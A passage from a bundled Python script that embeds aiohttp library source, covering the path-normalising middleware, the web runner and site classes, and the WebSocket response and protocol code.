slash"\r\n\r\n    @middleware\r\n    async def impl(request: Request, handler: Handler) -> StreamResponse:\r\n        if isinstance(request.match_info.route, SystemRoute):\r\n            paths_to_check = []\r\n            if "?" in request.raw_path:\r\n                path, query = request.raw_path.split("?", 1)\r\n                query = "?" + query\r\n            else:\r\n                query = ""\r\n                path = request.raw_path\r\n\r\n            if merge_slashes:\r\n                paths_to_check.append(re.sub("//+", "/", path))\r\n            if append_slash and not request.path.endswith("/"):\r\n                paths_to_check.append(path + "/")\r\n            if remove_slash and request.path.endswith("/"):\r\n                paths_to_check.append(path[:-1])\r\n            if merge_slashes and append_slash:\r\n                paths_to_check.append(re.sub("//+", "/", path + "/"))\r\n            if merge_slashes and remove_slash:\r\n                merged_slashes = re.sub("//+", "/", path)\r\n                paths_to_check.append(merged_slashes[:-1])\r\n\r\n            for path in paths_to_check:\r\n                path = re.sub("^//+", "/", path)  # SECURITY: GHSA-v6wp-4m6f-gcjg\r\n                resolves, request = await _check_request_resolves(request, path)\r\n                if resolves:\r\n                    raise redirect_class(request.raw_path + query)\r\n\r\n        return await handler(request)\r\n\r\n    return impl\r\n\r\n\r\ndef _fix_request_current_app(app: "Application") -> _Middleware:\r\n    @middleware\r\n    async def impl(request: Request, handler: Handler) -> StreamResponse:\r\n        with request.match_info.set_current_app(app):\r\n            return await handler(request)\r\n\r\n    return impl\r\n')
    __stickytape_write_module('aiohttp/web_runner.py', b'import asyncio\r\nimport signal\r\nimport socket\r\nfrom abc import ABC, abstractmethod\r\nfrom typing import Any, List, Optional, Set\r\n\r\nfrom yarl import URL\r\n\r\nfrom .web_app import Application\r\nfrom .web_server import Server\r\n\r\ntry:\r\n    from ssl import SSLContext\r\nexcept ImportError:\r\n    SSLContext = object  # type: ignore[misc,assignment]\r\n\r\n\r\n__all__ = (\r\n    "BaseSite",\r\n    "TCPSite",\r\n    "UnixSite",\r\n    "NamedPipeSite",\r\n    "SockSite",\r\n    "BaseRunner",\r\n    "AppRunner",\r\n    "ServerRunner",\r\n    "GracefulExit",\r\n)\r\n\r\n\r\nclass GracefulExit(SystemExit):\r\n    code = 1\r\n\r\n\r\ndef _raise_graceful_exit() -> None:\r\n    raise GracefulExit()\r\n\r\n\r\nclass BaseSite(ABC):\r\n    __slots__ = ("_runner", "_shutdown_timeout", "_ssl_context", "_backlog", "_server")\r\n\r\n    def __init__(\r\n        self,\r\n        runner: "BaseRunner",\r\n        *,\r\n        shutdown_timeout: float = 60.0,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        backlog: int = 128,\r\n    ) -> None:\r\n        if runner.server is None:\r\n            raise RuntimeError("Call runner.setup() before making a site")\r\n        self._runner = runner\r\n        self._shutdown_timeout = shutdown_timeout\r\n        self._ssl_context = ssl_context\r\n        self._backlog = backlog\r\n        self._server = None  # type: Optional[asyncio.AbstractServer]\r\n\r\n    @property\r\n    @abstractmethod\r\n    def name(self) -> str:\r\n        pass  # pragma: no cover\r\n\r\n    @abstractmethod\r\n    async def start(self) -> None:\r\n        self._runner._reg_site(self)\r\n\r\n    async def stop(self) -> None:\r\n        self._runner._check_site(self)\r\n        if self._server is None:\r\n            self._runner._unreg_site(self)\r\n            return  # not started yet\r\n        self._server.close()\r\n        # named pipes do not have wait_closed property\r\n        if hasattr(self._server, "wait_closed"):\r\n            await self._server.wait_closed()\r\n        await self._runner.shutdown()\r\n        assert self._runner.server\r\n        await self._runner.server.shutdown(self._shutdown_timeout)\r\n        self._runner._unreg_site(self)\r\n\r\n\r\nclass TCPSite(BaseSite):\r\n    __slots__ = ("_host", "_port", "_reuse_address", "_reuse_port")\r\n\r\n    def __init__(\r\n        self,\r\n        runner: "BaseRunner",\r\n        host: Optional[str] = None,\r\n        port: Optional[int] = None,\r\n        *,\r\n        shutdown_timeout: float = 60.0,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        backlog: int = 128,\r\n        reuse_address: Optional[bool] = None,\r\n        reuse_port: Optional[bool] = None,\r\n    ) -> None:\r\n        super().__init__(\r\n            runner,\r\n            shutdown_timeout=shutdown_timeout,\r\n            ssl_context=ssl_context,\r\n            backlog=backlog,\r\n        )\r\n        self._host = host\r\n        if port is None:\r\n            port = 8443 if self._ssl_context else 8080\r\n        self._port = port\r\n        self._reuse_address = reuse_address\r\n        self._reuse_port = reuse_port\r\n\r\n    @property\r\n    def name(self) -> str:\r\n        scheme = "https" if self._ssl_context else "http"\r\n        host = "0.0.0.0" if self._host is None else self._host\r\n        return str(URL.build(scheme=scheme, host=host, port=self._port))\r\n\r\n    async def start(self) -> None:\r\n        await super().start()\r\n        loop = asyncio.get_event_loop()\r\n        server = self._runner.server\r\n        assert server is not None\r\n        self._server = await loop.create_server(\r\n            server,\r\n            self._host,\r\n            self._port,\r\n            ssl=self._ssl_context,\r\n            backlog=self._backlog,\r\n            reuse_address=self._reuse_address,\r\n            reuse_port=self._reuse_port,\r\n        )\r\n\r\n\r\nclass UnixSite(BaseSite):\r\n    __slots__ = ("_path",)\r\n\r\n    def __init__(\r\n        self,\r\n        runner: "BaseRunner",\r\n        path: str,\r\n        *,\r\n        shutdown_timeout: float = 60.0,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        backlog: int = 128,\r\n    ) -> None:\r\n        super().__init__(\r\n            runner,\r\n            shutdown_timeout=shutdown_timeout,\r\n            ssl_context=ssl_context,\r\n            backlog=backlog,\r\n        )\r\n        self._path = path\r\n\r\n    @property\r\n    def name(self) -> str:\r\n        scheme = "https" if self._ssl_context else "http"\r\n        return f"{scheme}://unix:{self._path}:"\r\n\r\n    async def start(self) -> None:\r\n        await super().start()\r\n        loop = asyncio.get_event_loop()\r\n        server = self._runner.server\r\n        assert server is not None\r\n        self._server = await loop.create_unix_server(\r\n            server, self._path, ssl=self._ssl_context, backlog=self._backlog\r\n        )\r\n\r\n\r\nclass NamedPipeSite(BaseSite):\r\n    __slots__ = ("_path",)\r\n\r\n    def __init__(\r\n        self, runner: "BaseRunner", path: str, *, shutdown_timeout: float = 60.0\r\n    ) -> None:\r\n        loop = asyncio.get_event_loop()\r\n        if not isinstance(\r\n            loop, asyncio.ProactorEventLoop  # type: ignore[attr-defined]\r\n        ):\r\n            raise RuntimeError(\r\n                "Named Pipes only available in proactor" "loop under windows"\r\n            )\r\n        super().__init__(runner, shutdown_timeout=shutdown_timeout)\r\n        self._path = path\r\n\r\n    @property\r\n    def name(self) -> str:\r\n        return self._path\r\n\r\n    async def start(self) -> None:\r\n        await super().start()\r\n        loop = asyncio.get_event_loop()\r\n        server = self._runner.server\r\n        assert server is not None\r\n        _server = await loop.start_serving_pipe(  # type: ignore[attr-defined]\r\n            server, self._path\r\n        )\r\n        self._server = _server[0]\r\n\r\n\r\nclass SockSite(BaseSite):\r\n    __slots__ = ("_sock", "_name")\r\n\r\n    def __init__(\r\n        self,\r\n        runner: "BaseRunner",\r\n        sock: socket.socket,\r\n        *,\r\n        shutdown_timeout: float = 60.0,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        backlog: int = 128,\r\n    ) -> None:\r\n        super().__init__(\r\n            runner,\r\n            shutdown_timeout=shutdown_timeout,\r\n            ssl_context=ssl_context,\r\n            backlog=backlog,\r\n        )\r\n        self._sock = sock\r\n        scheme = "https" if self._ssl_context else "http"\r\n        if hasattr(socket, "AF_UNIX") and sock.family == socket.AF_UNIX:\r\n            name = f"{scheme}://unix:{sock.getsockname()}:"\r\n        else:\r\n            host, port = sock.getsockname()[:2]\r\n            name = str(URL.build(scheme=scheme, host=host, port=port))\r\n        self._name = name\r\n\r\n    @property\r\n    def name(self) -> str:\r\n        return self._name\r\n\r\n    async def start(self) -> None:\r\n        await super().start()\r\n        loop = asyncio.get_event_loop()\r\n        server = self._runner.server\r\n        assert server is not None\r\n        self._server = await loop.create_server(\r\n            server, sock=self._sock, ssl=self._ssl_context, backlog=self._backlog\r\n        )\r\n\r\n\r\nclass BaseRunner(ABC):\r\n    __slots__ = ("_handle_signals", "_kwargs", "_server", "_sites")\r\n\r\n    def __init__(self, *, handle_signals: bool = False, **kwargs: Any) -> None:\r\n        self._handle_signals = handle_signals\r\n        self._kwargs = kwargs\r\n        self._server = None  # type: Optional[Server]\r\n        self._sites = []  # type: List[BaseSite]\r\n\r\n    @property\r\n    def server(self) -> Optional[Server]:\r\n        return self._server\r\n\r\n    @property\r\n    def addresses(self) -> List[Any]:\r\n        ret = []  # type: List[Any]\r\n        for site in self._sites:\r\n            server = site._server\r\n            if server is not None:\r\n                sockets = server.sockets\r\n                if sockets is not None:\r\n                    for sock in sockets:\r\n                        ret.append(sock.getsockname())\r\n        return ret\r\n\r\n    @property\r\n    def sites(self) -> Set[BaseSite]:\r\n        return set(self._sites)\r\n\r\n    async def setup(self) -> None:\r\n        loop = asyncio.get_event_loop()\r\n\r\n        if self._handle_signals:\r\n            try:\r\n                loop.add_signal_handler(signal.SIGINT, _raise_graceful_exit)\r\n                loop.add_signal_handler(signal.SIGTERM, _raise_graceful_exit)\r\n            except NotImplementedError:  # pragma: no cover\r\n                # add_signal_handler is not implemented on Windows\r\n                pass\r\n\r\n        self._server = await self._make_server()\r\n\r\n    @abstractmethod\r\n    async def shutdown(self) -> None:\r\n        pass  # pragma: no cover\r\n\r\n    async def cleanup(self) -> None:\r\n        loop = asyncio.get_event_loop()\r\n\r\n        # The loop over sites is intentional, an exception on gather()\r\n        # leaves self._sites in unpredictable state.\r\n        # The loop guaranties that a site is either deleted on success or\r\n        # still present on failure\r\n        for site in list(self._sites):\r\n            await site.stop()\r\n        await self._cleanup_server()\r\n        self._server = None\r\n        if self._handle_signals:\r\n            try:\r\n                loop.remove_signal_handler(signal.SIGINT)\r\n                loop.remove_signal_handler(signal.SIGTERM)\r\n            except NotImplementedError:  # pragma: no cover\r\n                # remove_signal_handler is not implemented on Windows\r\n                pass\r\n\r\n    @abstractmethod\r\n    async def _make_server(self) -> Server:\r\n        pass  # pragma: no cover\r\n\r\n    @abstractmethod\r\n    async def _cleanup_server(self) -> None:\r\n        pass  # pragma: no cover\r\n\r\n    def _reg_site(self, site: BaseSite) -> None:\r\n        if site in self._sites:\r\n            raise RuntimeError(f"Site {site} is already registered in runner {self}")\r\n        self._sites.append(site)\r\n\r\n    def _check_site(self, site: BaseSite) -> None:\r\n        if site not in self._sites:\r\n            raise RuntimeError(f"Site {site} is not registered in runner {self}")\r\n\r\n    def _unreg_site(self, site: BaseSite) -> None:\r\n        if site not in self._sites:\r\n            raise RuntimeError(f"Site {site} is not registered in runner {self}")\r\n        self._sites.remove(site)\r\n\r\n\r\nclass ServerRunner(BaseRunner):\r\n    """Low-level web server runner"""\r\n\r\n    __slots__ = ("_web_server",)\r\n\r\n    def __init__(\r\n        self, web_server: Server, *, handle_signals: bool = False, **kwargs: Any\r\n    ) -> None:\r\n        super().__init__(handle_signals=handle_signals, **kwargs)\r\n        self._web_server = web_server\r\n\r\n    async def shutdown(self) -> None:\r\n        pass\r\n\r\n    async def _make_server(self) -> Server:\r\n        return self._web_server\r\n\r\n    async def _cleanup_server(self) -> None:\r\n        pass\r\n\r\n\r\nclass AppRunner(BaseRunner):\r\n    """Web Application runner"""\r\n\r\n    __slots__ = ("_app",)\r\n\r\n    def __init__(\r\n        self, app: Application, *, handle_signals: bool = False, **kwargs: Any\r\n    ) -> None:\r\n        super().__init__(handle_signals=handle_signals, **kwargs)\r\n        if not isinstance(app, Application):\r\n            raise TypeError(\r\n                "The first argument should be web.Application "\r\n                "instance, got {!r}".format(app)\r\n            )\r\n        self._app = app\r\n\r\n    @property\r\n    def app(self) -> Application:\r\n        return self._app\r\n\r\n    async def shutdown(self) -> None:\r\n        await self._app.shutdown()\r\n\r\n    async def _make_server(self) -> Server:\r\n        loop = asyncio.get_event_loop()\r\n        self._app._set_loop(loop)\r\n        self._app.on_startup.freeze()\r\n        await self._app.startup()\r\n        self._app.freeze()\r\n\r\n        return self._app._make_handler(loop=loop, **self._kwargs)\r\n\r\n    async def _cleanup_server(self) -> None:\r\n        await self._app.cleanup()\r\n')
    __stickytape_write_module('aiohttp/web_ws.py', b'import asyncio\r\nimport base64\r\nimport binascii\r\nimport hashlib\r\nimport json\r\nfrom typing import Any, Iterable, Optional, Tuple, cast\r\n\r\nimport async_timeout\r\nimport attr\r\nfrom multidict import CIMultiDict\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import call_later, set_result\r\nfrom .http import (\r\n    WS_CLOSED_MESSAGE,\r\n    WS_CLOSING_MESSAGE,\r\n    WS_KEY,\r\n    WebSocketError,\r\n    WebSocketReader,\r\n    WebSocketWriter,\r\n    WSCloseCode,\r\n    WSMessage,\r\n    WSMsgType as WSMsgType,\r\n    ws_ext_gen,\r\n    ws_ext_parse,\r\n)\r\nfrom .log import ws_logger\r\nfrom .streams import EofStream, FlowControlDataQueue\r\nfrom .typedefs import Final, JSONDecoder, JSONEncoder\r\nfrom .web_exceptions import HTTPBadRequest, HTTPException\r\nfrom .web_request import BaseRequest\r\nfrom .web_response import StreamResponse\r\n\r\n__all__ = (\r\n    "WebSocketResponse",\r\n    "WebSocketReady",\r\n    "WSMsgType",\r\n)\r\n\r\nTHRESHOLD_CONNLOST_ACCESS: Final[int] = 5\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass WebSocketReady:\r\n    ok: bool\r\n    protocol: Optional[str]\r\n\r\n    def __bool__(self) -> bool:\r\n        return self.ok\r\n\r\n\r\nclass WebSocketResponse(StreamResponse):\r\n\r\n    _length_check = False\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        timeout: float = 10.0,\r\n        receive_timeout: Optional[float] = None,\r\n        autoclose: bool = True,\r\n        autoping: bool = True,\r\n        heartbeat: Optional[float] = None,\r\n        protocols: Iterable[str] = (),\r\n        compress: bool = True,\r\n        max_msg_size: int = 4 * 1024 * 1024,\r\n    ) -> None:\r\n        super().__init__(status=101)\r\n        self._protocols = protocols\r\n        self._ws_protocol = None  # type: Optional[str]\r\n        self._writer = None  # type: Optional[WebSocketWriter]\r\n        self._reader = None  # type: Optional[FlowControlDataQueue[WSMessage]]\r\n        self._closed = False\r\n        self._closing = False\r\n        self._conn_lost = 0\r\n        self._close_code = None  # type: Optional[int]\r\n        self._loop = None  # type: Optional[asyncio.AbstractEventLoop]\r\n        self._waiting = None  # type: Optional[asyncio.Future[bool]]\r\n        self._exception = None  # type: Optional[BaseException]\r\n        self._timeout = timeout\r\n        self._receive_timeout = receive_timeout\r\n        self._autoclose = autoclose\r\n        self._autoping = autoping\r\n        self._heartbeat = heartbeat\r\n        self._heartbeat_cb: Optional[asyncio.TimerHandle] = None\r\n        if heartbeat is not None:\r\n            self._pong_heartbeat = heartbeat / 2.0\r\n        self._pong_response_cb: Optional[asyncio.TimerHandle] = None\r\n        self._compress = compress\r\n        self._max_msg_size = max_msg_size\r\n\r\n    def _cancel_heartbeat(self) -> None:\r\n        if self._pong_response_cb is not None:\r\n            self._pong_response_cb.cancel()\r\n            self._pong_response_cb = None\r\n\r\n        if self._heartbeat_cb is not None:\r\n            self._heartbeat_cb.cancel()\r\n            self._heartbeat_cb = None\r\n\r\n    def _reset_heartbeat(self) -> None:\r\n        self._cancel_heartbeat()\r\n\r\n        if self._heartbeat is not None:\r\n            assert self._loop is not None\r\n            self._heartbeat_cb = call_later(\r\n                self._send_heartbeat, self._heartbeat, self._loop\r\n            )\r\n\r\n    def _send_heartbeat(self) -> None:\r\n        if self._heartbeat is not None and not self._closed:\r\n            assert self._loop is not None\r\n            # fire-and-forget a task is not perfect but maybe ok for\r\n            # sending ping. Otherwise we need a long-living heartbeat\r\n            # task in the class.\r\n            self._loop.create_task(self._writer.ping())  # type: ignore[union-attr]\r\n\r\n            if self._pong_response_cb is not None:\r\n                self._pong_response_cb.cancel()\r\n            self._pong_response_cb = call_later(\r\n                self._pong_not_received, self._pong_heartbeat, self._loop\r\n            )\r\n\r\n    def _pong_not_received(self) -> None:\r\n        if self._req is not None and self._req.transport is not None:\r\n            self._closed = True\r\n            self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n            self._exception = asyncio.TimeoutError()\r\n            self._req.transport.close()\r\n\r\n    async def prepare(self, request: BaseRequest) -> AbstractStreamWriter:\r\n        # make pre-check to don\'t hide it by do_handshake() exceptions\r\n        if self._payload_writer is not None:\r\n            return self._payload_writer\r\n\r\n        protocol, writer = self._pre_start(request)\r\n        payload_writer = await super().prepare(request)\r\n        assert payload_writer is not None\r\n        self._post_start(request, protocol, writer)\r\n        await payload_writer.drain()\r\n        return payload_writer\r\n\r\n    def _handshake(\r\n        self, request: BaseRequest\r\n    ) -> Tuple["CIMultiDict[str]", str, bool, bool]:\r\n        headers = request.headers\r\n        if "websocket" != headers.get(hdrs.UPGRADE, "").lower().strip():\r\n            raise HTTPBadRequest(\r\n                text=(\r\n                    "No WebSocket UPGRADE hdr: {}\\n Can "\r\n                    \'"Upgrade" only to "WebSocket".\'\r\n                ).format(headers.get(hdrs.UPGRADE))\r\n            )\r\n\r\n        if "upgrade" not in headers.get(hdrs.CONNECTION, "").lower():\r\n            raise HTTPBadRequest(\r\n                text="No CONNECTION upgrade hdr: {}".format(\r\n                    headers.get(hdrs.CONNECTION)\r\n                )\r\n            )\r\n\r\n        # find common sub-protocol between client and server\r\n        protocol = None\r\n        if hdrs.SEC_WEBSOCKET_PROTOCOL in headers:\r\n            req_protocols = [\r\n                str(proto.strip())\r\n                for proto in headers[hdrs.SEC_WEBSOCKET_PROTOCOL].split(",")\r\n            ]\r\n\r\n            for proto in req_protocols:\r\n                if proto in self._protocols:\r\n                    protocol = proto\r\n                    break\r\n            else:\r\n                # No overlap found: Return no protocol as per spec\r\n                ws_logger.warning(\r\n                    "Client protocols %r don\xe2\x80\x99t overlap server-known ones %r",\r\n                    req_protocols,\r\n                    self._protocols,\r\n                )\r\n\r\n        # check supported version\r\n        version = headers.get(hdrs.SEC_WEBSOCKET_VERSION, "")\r\n        if version not in ("13", "8", "7"):\r\n            raise HTTPBadRequest(text=f"Unsupported version: {version}")\r\n\r\n        # check client handshake for validity\r\n        key = headers.get(hdrs.SEC_WEBSOCKET_KEY)\r\n        try:\r\n            if not key or len(base64.b64decode(key)) != 16:\r\n                raise HTTPBadRequest(text=f"Handshake error: {key!r}")\r\n        except binascii.Error:\r\n            raise HTTPBadRequest(text=f"Handshake error: {key!r}") from None\r\n\r\n        accept_val = base64.b64encode(\r\n            hashlib.sha1(key.encode() + WS_KEY).digest()\r\n        ).decode()\r\n        response_headers = CIMultiDict(  # type: ignore[var-annotated]\r\n            {\r\n                hdrs.UPGRADE: "websocket",  # type: ignore[arg-type]\r\n                hdrs.CONNECTION: "upgrade",\r\n                hdrs.SEC_WEBSOCKET_ACCEPT: accept_val,\r\n            }\r\n        )\r\n\r\n        notakeover = False\r\n        compress = 0\r\n        if self._compress:\r\n            extensions = headers.get(hdrs.SEC_WEBSOCKET_EXTENSIONS)\r\n            # Server side always get return with no exception.\r\n            # If something happened, just drop compress extension\r\n            compress, notakeover = ws_ext_parse(extensions, isserver=True)\r\n            if compress:\r\n                enabledext = ws_ext_gen(\r\n                    compress=compress, isserver=True, server_notakeover=notakeover\r\n                )\r\n                response_headers[hdrs.SEC_WEBSOCKET_EXTENSIONS] = enabledext\r\n\r\n        if protocol:\r\n            response_headers[hdrs.SEC_WEBSOCKET_PROTOCOL] = protocol\r\n        return (\r\n            response_headers,\r\n            protocol,\r\n            compress,\r\n            notakeover,\r\n        )  # type: ignore[return-value]\r\n\r\n    def _pre_start(self, request: BaseRequest) -> Tuple[str, WebSocketWriter]:\r\n        self._loop = request._loop\r\n\r\n        headers, protocol, compress, notakeover = self._handshake(request)\r\n\r\n        self.set_status(101)\r\n        self.headers.update(headers)\r\n        self.force_close()\r\n        self._compress = compress\r\n        transport = request._protocol.transport\r\n        assert transport is not None\r\n        writer = WebSocketWriter(\r\n            request._protocol, transport, compress=compress, notakeover=notakeover\r\n        )\r\n\r\n        return protocol, writer\r\n\r\n    def _post_start(\r\n        self, request: BaseRequest, protocol: str, writer: WebSocketWriter\r\n    ) -> None:\r\n        self._ws_protocol = protocol\r\n        self._writer = writer\r\n\r\n        self._reset_heartbeat()\r\n\r\n        loop = self._loop\r\n        assert loop is not None\r\n        self._reader = FlowControlDataQueue(request._protocol, 2 ** 16, loop=loop)\r\n        request.protocol.set_parser(\r\n            WebSocketReader(self._reader, self._max_msg_size, compress=self._compress)\r\n        )\r\n        # disable HTTP keepalive for WebSocket\r\n        request.protocol.keep_alive(False)\r\n\r\n    def can_prepare(self, request: BaseRequest) -> WebSocketReady:\r\n        if self._writer is not None:\r\n            raise RuntimeError("Already started")\r\n        try:\r\n            _, protocol, _, _ = self._handshake(request)\r\n        except HTTPException:\r\n            return WebSocketReady(False, None)\r\n        else:\r\n            return WebSocketReady(True, protocol)\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        return self._closed\r\n\r\n    @property\r\n    def close_code(self) -> Optional[int]:\r\n        return self._close_code\r\n\r\n    @property\r\n    def ws_protocol(self) -> Optional[str]:\r\n        return self._ws_protocol\r\n\r\n    @property\r\n    def compress(self) -> bool:\r\n        return self._compress\r\n\r\n    def exception(self) -> Optional[BaseException]:\r\n        return self._exception\r\n\r\n    async def ping(self, message: bytes = b"") -> None:\r\n        if self._writer is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n        await self._writer.ping(message)\r\n\r\n    async def pong(self, message: bytes = b"") -> None:\r\n        # unsolicited pong\r\n        if self._writer is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n        await self._writer.pong(message)\r\n\r\n    async def send_str(self, data: str, compress: Optional[bool] = None) -> None:\r\n        if self._writer is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n        if not isinstance(data, str):\r\n            raise TypeError("data argument must be str (%r)" % type(data))\r\n        await self._writer.send(data, binary=False, compress=compress)\r\n\r\n    async def send_bytes(self, data: bytes, compress: Optional[bool] = None) -> None:\r\n        if self._writer is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n        if not isinstance(data, (bytes, bytearray, memoryview)):\r\n            raise TypeError("data argument must be byte-ish (%r)" % type(data))\r\n        await self._writer.send(data, binary=True, compress=compress)\r\n\r\n    async def send_json(\r\n        self,\r\n        data: Any,\r\n        compress: Optional[bool] = None,\r\n        *,\r\n        dumps: JSONEncoder = json.dumps,\r\n    ) -> None:\r\n        await self.send_str(dumps(data), compress=compress)\r\n\r\n    async def write_eof(self) -> None:  # type: ignore[override]\r\n        if self._eof_sent:\r\n            return\r\n        if self._payload_writer is None:\r\n            raise RuntimeError("Response has not been started")\r\n\r\n        await self.close()\r\n        self._eof_sent = True\r\n\r\n    async def close(self, *, code: int = WSCloseCode.OK, message: bytes = b"") -> bool:\r\n        if self._writer is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n\r\n        self._cancel_heartbeat()\r\n        reader = self._reader\r\n        assert reader is not None\r\n\r\n        # we need to break `receive()` cycle first,\r\n        # `close()` may be called from different task\r\n        if self._waiting is not None and not self._closed:\r\n            reader.feed_data(WS_CLOSING_MESSAGE, 0)\r\n            await self._waiting\r\n\r\n        if not self._closed:\r\n            self._closed = True\r\n            try:\r\n                await self._writer.close(code, message)\r\n                writer = self._payload_writer\r\n                assert writer is not None\r\n                await writer.drain()\r\n            except (asyncio.CancelledError, asyncio.TimeoutError):\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                raise\r\n            except Exception as exc:\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                self._exception = exc\r\n                return True\r\n\r\n            if self._closing:\r\n                return True\r\n\r\n            reader = self._reader\r\n            assert reader is not None\r\n            try:\r\n                async with async_timeout.timeout(self._timeout):\r\n                    msg = await reader.read()\r\n            except asyncio.CancelledError:\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                raise\r\n            except Exception as exc:\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                self._exception = exc\r\n                return True\r\n\r\n            if msg.type == WSMsgType.CLOSE:\r\n                self._close_code = msg.data\r\n                return True\r\n\r\n            self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n            self._exception = asyncio.TimeoutError()\r\n            return True\r\n        else:\r\n            return False\r\n\r\n    async def receive(self, timeout: Optional[float] = None) -> WSMessage:\r\n        if self._reader is None:\r\n            raise RuntimeError("Call .prepare() first")\r\n\r\n        loop = self._loop\r\n        assert loop is not None\r\n        while True:\r\n            if self._waiting is not None:\r\n                raise RuntimeError("Concurrent call to receive() is not allowed")\r\n\r\n            if self._closed:\r\n                self._conn_lost += 1\r\n                if self._conn_lost >= THRESHOLD_CONNLOST_ACCESS:\r\n                    raise RuntimeError("WebSocket connection is closed.")\r\n                return WS_CLOSED_MESSAGE\r\n            elif self._closing:\r\n                return WS_CLOSING_MESSAGE\r\n\r\n            try:\r\n                self._waiting = loop.create_future()\r\n                try:\r\n                    async with async_timeout.timeout(timeout or self._receive_timeout):\r\n                        msg = await self._reader.read()\r\n                    self._reset_heartbeat()\r\n                finally:\r\n                    waiter = self._waiting\r\n                    set_result(waiter, True)\r\n                    self._waiting = None\r\n            except (asyncio.CancelledError, asyncio.TimeoutError):\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                raise\r\n            except EofStream:\r\n                self._close_code = WSCloseCode.OK\r\n                await self.close()\r\n                return WSMessage(WSMsgType.CLOSED, None, None)\r\n            except WebSocketError as exc:\r\n                self._close_code = exc.code\r\n                await self.close(code=exc.code)\r\n                return WSMessage(WSMsgType.ERROR, exc, None)\r\n            except Exception as exc:\r\n                self._exception = exc\r\n                self._closing = True\r\n                self._close_code = WSCloseCode.ABNORMAL_CLOSURE\r\n                await self.close()\r\n                return WSMessage(WSMsgType.ERROR, exc, None)\r\n\r\n            if msg.type == WSMsgType.CLOSE:\r\n                self._closing = True\r\n                self._close_code = msg.data\r\n                if not self._closed and self._autoclose:\r\n                    await self.close()\r\n            elif msg.type == WSMsgType.CLOSING:\r\n                self._closing = True\r\n            elif msg.type == WSMsgType.PING and self._autoping:\r\n                await self.pong(msg.data)\r\n                continue\r\n            elif msg.type == WSMsgType.PONG and self._autoping:\r\n                continue\r\n\r\n            return msg\r\n\r\n    async def receive_str(self, *, timeout: Optional[float] = None) -> str:\r\n        msg = await self.receive(timeout)\r\n        if msg.type != WSMsgType.TEXT:\r\n            raise TypeError(\r\n                "Received message {}:{!r} is not WSMsgType.TEXT".format(\r\n                    msg.type, msg.data\r\n                )\r\n            )\r\n        return cast(str, msg.data)\r\n\r\n    async def receive_bytes(self, *, timeout: Optional[float] = None) -> bytes:\r\n        msg = await self.receive(timeout)\r\n        if msg.type != WSMsgType.BINARY:\r\n            raise TypeError(f"Received message {msg.type}:{msg.data!r} is not bytes")\r\n        return cast(bytes, msg.data)\r\n\r\n    async def receive_json(\r\n        self, *, loads: JSONDecoder = json.loads, timeout: Optional[float] = None\r\n    ) -> Any:\r\n        data = await self.receive_str(timeout=timeout)\r\n        return loads(data)\r\n\r\n    async def write(self, data: bytes) -> None:\r\n        raise RuntimeError("Cannot call .write() for websocket")\r\n\r\n    def __aiter__(self) -> "WebSocketResponse":\r\n        return self\r\n\r\n    async def __anext__(self) -> WSMessage:\r\n        msg = await self.receive()\r\n        if msg.type in (WSMsgType.CLOSE, WSMsgType.CLOSING, WSMsgType.CLOSED):\r\n            raise StopAsyncIteration\r\n        return msg\r\n\r\n    def _cancel(self, exc: BaseException) -> None:\r\n        if self._reader is not None:\r\n            self._reader.set_exception(exc)\r\n')
    __stickytape_write_module('aiohttp/http_websocket.py', b'"""WebSocket protocol versions 13 and 8."""\r\n\r\nimport asyncio\r\nimport collections\r\nimport json\r\nimport random\r\nimport re\r\nimport sys\r\nimport zlib\r\nfrom enum import IntEnum\r\nfrom struct import Struct\r\nfrom typing import Any, Callable, List, Optional, Pattern, Set, Tuple, Union, cast\r\n\r\nfrom .base_protocol import BaseProtocol\r\nfrom .helpers import NO_EXTENSIONS\r\nfrom .streams import DataQueue\r\nfrom .typedefs import Final\r\n\r\n__all__ = (\r\n    "WS_CLOSED_MESSAGE",\r\n    "WS_CLOSING_MESSAGE",\r\n    "WS_KEY",\r\n    "WebSocketReader",\r\n    "WebSocketWriter",\r\n    "WSMessage",\r\n    "WebSocketError",\r\n    "WSMsgType",\r\n    "WSCloseCode",\r\n)\r\n\r\n\r\nclass WSCloseCode(IntEnum):\r\n    OK = 1000\r\n    GOING_AWAY = 1001\r\n    PROTOCOL_ERROR = 1002\r\n    UNSUPPORTED_DATA = 1003\r\n    ABNORMAL_CLOSURE = 1006\r\n    INVALID_TEXT = 1007\r\n    POLICY_VIOLATION = 1008\r\n    MESSAGE_TOO_BIG = 1009\r\n    MANDATORY_EXTENSION = 1010\r\n    INTERNAL_ERROR = 1011\r\n    SERVICE_RESTART = 1012\r\n    TRY_AGAIN_LATER = 1013\r\n    BAD_GATEWAY = 1014\r\n\r\n\r\nALLOWED_CLOSE_CODES: Final[Set[int]] = {int(i) for i in WSCloseCode}\r\n\r\n\r\nclass WSMsgType(IntEnum):\r\n    # websocket spec types\r\n    CONTINUATION = 0x0\r\n    TEXT = 0x1\r\n    BINARY = 0x2\r\n    PING = 0x9\r\n    PONG = 0xA\r\n    CLOSE = 0x8\r\n\r\n    # aiohttp specific types\r\n    CLOSING = 0x100\r\n    CLOSED = 0x101\r\n    ERROR = 0x102\r\n\r\n    text = TEXT\r\n    binary = BINARY\r\n    ping = PING\r\n    pong = PONG\r\n    close = CLOSE\r\n    closing = CLOSING\r\n    closed = CLOSED\r\n    error = ERROR\r\n\r\n\r\nWS_KEY: Final[bytes] = 